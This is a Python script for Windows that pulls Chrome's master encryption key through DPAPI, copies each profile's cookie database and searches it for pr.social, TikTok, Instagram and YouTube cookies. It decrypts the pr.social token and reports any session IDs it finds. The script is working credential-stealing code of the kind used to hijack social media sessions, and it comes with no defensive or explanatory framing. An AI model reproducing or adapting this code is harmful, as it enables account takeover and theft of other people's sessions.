import os
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Cryptodome.Cipher import AES

def get_encryption_key():
    local_state_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_cookie(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
        except Exception:
            return ""

key = get_encryption_key()
base_dir = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data')
profiles = [d for d in os.listdir(base_dir) if d.startswith('Profile') or d == 'Default']

for prof in profiles:
    db_path = os.path.join(base_dir, prof, 'Network', 'Cookies')
    if not os.path.exists(db_path):
        continue
    try:
        tmp_db = os.path.join(tempfile.gettempdir(), f"cookies_{prof}.db")
        shutil.copy2(db_path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cur = conn.cursor()
        cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%pr.social%' OR host_key LIKE '%tiktok%' OR host_key LIKE '%instagram%' OR host_key LIKE '%youtube%'")
        rows = cur.fetchall()
        if rows:
            found_hosts = set(r[0] for r in rows)
            print(f"[{prof}] -> Found {len(rows)} cookies on hosts: {found_hosts}")
            # check for pr.social token
            for host, name, enc in rows:
                if "pr.social" in host and name == "token":
                    val = decrypt_cookie(enc, key)
                    print(f"   >>> PR.SOCIAL TOKEN FOUND in {prof}!")
                if "tiktok" in host and name == "sessionid":
                    print(f"   >>> TIKTOK sessionid FOUND in {prof}!")
                if "instagram" in host and name == "sessionid":
                    print(f"   >>> INSTAGRAM sessionid FOUND in {prof}!")
        conn.close()
        os.remove(tmp_db)
    except Exception as e:
        pass
